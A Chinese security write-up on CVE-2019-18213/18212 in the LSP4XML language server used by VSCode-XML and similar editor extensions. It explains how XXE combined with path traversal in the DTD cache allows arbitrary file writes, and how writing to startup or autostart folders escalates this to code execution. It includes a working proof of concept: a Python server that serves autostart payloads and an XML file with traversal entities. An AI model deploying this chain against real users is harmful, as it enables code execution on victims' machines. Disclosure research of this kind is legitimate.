**LSP4XML是一个XML文件解析库，被VSCode/Eclipse/Theia等知名编辑器中使用，如vscode的VSCode-XML扩展、Eclipse的 wildwebdeveloper扩展,Theia的theia-xml扩展等等, 可以实现XXE攻击
(CVE-2019-18213) 导致RCE攻击 (CVE-2019-18212) ，这仅仅只需要打开一个XML文件。**

## 起源

2019年似乎是XXE的一年：在最新的很多渗透测试中，我们成功利用了相当数量的 XXEs。VSCode-XML允许在打开XML/DTD/XSTL/XSD文件并分析它们的语法错误，关键是对照DTD / XSD定义去验证XML / XSTL文件。

![](https://image.3001.net/images/20191218/1576645291_5df9b2abd0fc9.jpg!small)

通过分析该扩展代码（<https://github.com/redhat-developer/vscode-xml>），很容易理解它只是一个虚拟客户端，所有的XML解析都是由LSP4XML语言服务器（<https://github.com/angelozerr/lsp4xml>）完成的。

事实证明，XXE 漏洞存在于LSP4XML ，当Visual Studio Code （安装过VSCode-XML）在打开XML后
，每次编辑或保存XML文件时，LSP4XML都将在本地解析文件并在VSCode中报告任何错误。

## 失败的思路

我们发现 XXE 它是在文件打开时触发的，但是我们可以利用此漏洞吗？

我们尝试了在这种情况下使用的常见OOB渗透技巧，但是由于最近的Java版本（1.8+）和URI解析的结合，所有操作都失败了。

我们唯一可以执行的操作是：

> （1）Blind SSRF
>
> （2）Windows上NetNTLMv2

## 新发现-奇怪的行为

在测试XXE时，我们注意到XXE 一种奇怪的（而且很无聊）的行为：URL只被检索一次。很明显，一定是存在某种缓存机制，可能将我们的文件（称为
DTDs）下载并存储在某处……这里可能存在问题吗？

接下来分析其缓存过程：

> 1、解析XML文件
>
> 2、如果引用了外部实体，则注明其URL
>
> 3、通过检查目录， 使用指定的URL来验证来自同一主机的文件是否已被缓存（CacheResourcesManager.java#L98）
>
> 4、如果缓存条目不存在，则将文件下载并移动到 $HOME/.lsp4xml/cache/http/$host/$path_of_file

假如我们可以完全控制文件的路径，如果外部实体在路径中包含 ../ ，会发生什么情况呢？

是的！ 在保存缓存文件时，缓存过程很容易受到 路径遍历的影响，从而可以在任意本地目录中写入任意远程文件。

如果还没有创建所需的文件夹结构，此过程也是如此。

## 构造从XXE到RCE的过程

该漏洞位于缓存过程的最后一步，其中 $path_of_file
未进行清理，因此，如果外部实体的URL是<http://attack.er/../../../../Desktop/test.txt>
缓存文件，则将写入该文件
$HOME/Desktop/test.txt，这基本上是任意文件写入。唯一的限制是，由于解析过程的第3点，因此无法覆盖任何文件，并且显然所有操作都是使用当前用户权限集完成的（因此，如果当前用户是管理员，我们可以在任何地方写，否则只能在其主目录/世界可写目录）。

最终，我们可以通过滥用启动/自动启动机制来轻松实现RCE：

> （1）在Windows系统上，通过将批处理文件引用为外部实体并使用路径遍历将其写入
> $HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ 文件夹中。
>
> （2）在大多数GNU / Linux系统上，通过在$HOME/.config/autostart/ 文件夹中写入“桌面”文件 。

现在，我们只需要等待受害者注销并再次在其计算机上登录以获得执行的代码即可！

在完成LSP4XML的利用链之后，我们检查了谁还在使用该库 VSCode-XML ，并且我们发现 Eclipse的wildwebdeveloper扩展 和
Theia的theia-xml扩展 也很容易受到攻击-可能还有更多！

## POC

以下是在Windows和GNU / Linux系统上利用XXE并实现RCE的步骤：

1.安装Visual Studio Code和“ vscode-xml”（称为“ RedHat的XML”）扩展<0.9.1版本

2.保存下面的Python3代码，并使用 python3 server.py

    
    
    #!/usr/bin/env python3
    from http.server import HTTPServer, BaseHTTPRequestHandler
     
    class RequestHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.end_headers()
            if '.desktop' in self.path:
                self.wfile.write(b'[Desktop Entry]\nName=Exploit\nGenericName=\nComment=\nExec=sh -c "id;read"\nTerminal=true\nType=Application\nX-GNOME-Autostart-enabled=true')	
            else:
                self.wfile.write(b'start cmd.exe /k "whoami"')
            
    def run(server_class=HTTPServer, handler_class=RequestHandler, port=9000):
        server_address = ('', port)
        httpd = server_class(server_address, handler_class)
        print('Starting httpd on port {}...'.format(port))
        httpd.serve_forever()
     
    run()  
    

3.在Visual Studio Code中复制并粘贴以下内容：  

    
    
    <?xml version="1.0"?>
    <!DOCTYPE r [ 
        <!ENTITY linux SYSTEM "http://127.0.0.1:9000/../../../../.config/autostart/cmd.desktop">
        <!ENTITY windows SYSTEM "http://127.0.0.1:9000/../../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/cmd.bat"> 
    ]>
    <r>&amplinux&ampwindows</r>  
    

4.保存为XML文件。

5.注意对Python3 Web服务器的请求。

6.注销和登录后，将执行注入的命令（即，在Windows whoami上，在GNU上打开“命令提示符”并执行该命令）。 /
Linux，将打开“终端”并id执行命令）。

最终测试效果如下：

![](https://image.3001.net/images/20200107/1578363432_5e13ea2849916.gif)

 ***本文原创作者：freexploit，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

